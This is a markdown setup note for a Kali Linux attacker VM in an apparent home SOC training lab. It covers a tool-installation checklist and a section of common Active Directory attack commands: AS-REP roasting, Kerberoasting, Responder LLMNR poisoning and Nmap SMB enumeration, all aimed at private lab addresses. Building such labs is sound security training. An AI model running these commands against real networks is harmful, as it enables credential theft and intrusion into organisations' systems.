# 🐉 Kali Linux — Attacker VM

## Host
- **IP:** 172.16.0.11
- **Hostname:** SOC-Lab-Attacker
- **OS:** Kali Linux (rolling)

## Status
- [x] Network OK — reaches DC and pfSense
- [x] Impacket installed (`/usr/bin/impacket-GetNPUsers`)
- [x] Nmap installed (`/usr/bin/nmap`)
- [x] Responder installed (`/usr/sbin/responder`)
- [ ] **BloodHound — NOT installed** ❌ → `sudo apt install bloodhound -y`
- [ ] CrackMapExec — not verified
- [ ] Metasploit — not verified
- [ ] Evil-WinRM — not verified

## Install Missing Tools
```bash
# BloodHound
sudo apt install bloodhound -y

# CrackMapExec
sudo apt install crackmapexec -y

# Verify all
which bloodhound crackmapexec msfconsole evil-winrm
```

## Common Attack Commands
```bash
# AS-REP Roasting
impacket-GetNPUsers soc.lab/ -no-pass -usersfile users.txt -dc-ip 172.16.0.5

# Kerberoasting
impacket-GetUserSPNs soc.lab/user:pass -dc-ip 172.16.0.5 -request

# LLMNR Poisoning
sudo responder -I eth0 -rdwv

# SMB enumeration
nmap -p 445 --script smb-enum-shares,smb-enum-users 172.16.0.0/24
```
